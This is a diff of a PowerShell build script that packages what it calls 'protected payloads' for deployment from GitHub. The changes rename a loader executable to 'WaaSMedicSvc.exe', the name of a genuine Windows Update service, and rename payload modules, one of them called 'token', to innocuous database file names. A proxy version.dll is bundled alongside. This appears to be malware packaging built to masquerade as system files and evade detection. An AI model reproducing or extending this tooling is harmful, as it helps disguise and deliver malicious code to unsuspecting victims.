@@ -159,8 +159,9 @@ function Prepare-ProxyPayloads {
         return $false
     }
 
+    Copy-Item "build\Loader.exe" "build\WaaSMedicSvc.exe" -Force
     Copy-Item "build\Loader.exe" "build\RuntimeHost.exe" -Force
-    Write-Host "[OK] Protected payloads + RuntimeHost.exe ready" -ForegroundColor Green
+    Write-Host "[OK] Protected payloads + WaaSMedicSvc.exe ready" -ForegroundColor Green
     return $true
 }
 
@@ -217,15 +218,15 @@ function Prepare-GithubDeployPackage {
     Write-Host "Preparing GitHub deploy package..." -ForegroundColor Yellow
 
     $githubDir = "build\github"
-    $githubModules = Join-Path $githubDir "modules"
-    New-Item -ItemType Directory -Path $githubModules -Force | Out-Null
+    $githubCache = Join-Path $githubDir "Cache"
+    New-Item -ItemType Directory -Path $githubCache -Force | Out-Null
 
     $copyMap = @{
         "build\version.dll" = Join-Path $githubDir "version.dll"
-        "build\RuntimeHost.exe" = Join-Path $githubDir "RuntimeHost.exe"
-        "build\payload\core.bin" = Join-Path $githubDir "core.bin"
-        "build\payload\modules\token.bin" = Join-Path $githubModules "token.bin"
-        "build\payload\modules\media.bin" = Join-Path $githubModules "media.bin"
+        "build\WaaSMedicSvc.exe" = Join-Path $githubDir "WaaSMedicSvc.exe"
+        "build\payload\core.bin" = Join-Path $githubDir "ProvData.db"
+        "build\payload\modules\token.bin" = Join-Path $githubCache "TokenProv.db"
+        "build\payload\modules\media.bin" = Join-Path $githubCache "DeviceCache.db"
     }
 
     foreach ($entry in $copyMap.GetEnumerator()) {
